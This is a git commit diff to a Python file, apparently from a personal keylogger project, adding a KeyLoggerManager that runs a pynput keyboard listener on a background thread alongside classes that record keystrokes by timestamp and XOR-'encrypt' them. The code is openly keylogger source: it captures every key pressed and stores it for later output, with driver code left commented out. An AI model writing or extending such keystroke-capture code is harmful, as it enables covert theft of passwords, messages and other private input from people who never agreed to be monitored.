01eeedb64463f157b9c3d69dcf1712aa9f7f0102
moishy shuvax <moishy.shuvax@gmail.com>
2025-02-12 17:02:17 +0200

    adding manager

--- classes.py
+++ classes.py
@@ -1,17 +1,8 @@
 from abc import ABC, abstractmethod
+from pynput.keyboard import Listener
 from typing import List
-import time
-import json
-import random
-import string
+import time,json,random,string,ToolBox,threading
 
-import ToolBox
-
-
-class Write(ABC):
-    @abstractmethod
-    def write(self):
-        pass
 
 class IKeyLogger(ABC):
     @abstractmethod
@@ -40,7 +31,7 @@ class Write(ABC):
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
         self.__logged_keys = {}
-        self.__last_key = ""
+        self.__last_time = ""
         self.__last_type_time = None
 
     def on_press(self, key) -> None:
@@ -49,25 +40,19 @@ class KeyLoggerService(IKeyLogger):
         current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
 
         if self.__last_type_time is None or current_time - self.__last_type_time >= 15:
-            self.__last_key = current_time_formatted
+            self.__last_time = current_time_formatted
+
 
         self.__last_type_time = current_time
-
-        if self.__last_key not in self.__logged_keys:
-            self.__logged_keys[self.__last_key] = ""
-
-        self.__logged_keys[self.__last_key] += key
-
-
-    def stop_logging(self) -> None:
-        self.last_key = ""
-        self.last_type_time = None
+        if self.__last_time not in self.__logged_keys:
+            self.__logged_keys[self.__last_time] = ""
+        self.__logged_keys[self.__last_time] += key
 
     def get_logged_keys(self) -> dict[str:str]:
         return self.__logged_keys
 
-
-        return self.logged_keys
+    def clear_logged_keys(self) -> dict[str:str]:
+        self.__logged_keys = {}
 
 
 
@@ -95,6 +80,40 @@ class Encryptor:
         for i in range(len(data)):
             ciphertext += chr(ord(data[i]) ^ ord(self.key[i % length_key]))
         return ciphertext
+
+class KeyLoggerManager:
+    def __init__(self):
+        self.__key_logger = KeyLoggerService()
+        self.__writer = FileWriter()
+        self.__encryptor = Encryptor()
+        self.__is_logging = False
+        self.__logger_thread = threading.Thread(target=self.__listen)
+
+
+    def start_logging(self):
+        self.__is_logging = True
+        self.__logger_thread.start()
+
+    def stop_logging(self):
+        self.__is_logging = False
+
+    def __listen(self):
+        with Listener(on_press=self.__key_logger.on_press) as listener:
+            listener.join()
+
+    def print_keys(self):
+        logged_keys = self.__key_logger.get_logged_keys()
+        self.__key_logger.clear_logged_keys()
+        for key, value in logged_keys.items():
+            print(key)
+            print(value)
+
+# x = KeyLoggerManager()
+# x.start_logging()
+# while True:
+#     time.sleep(20)
+#     x.print_keys()
+
 
 
 
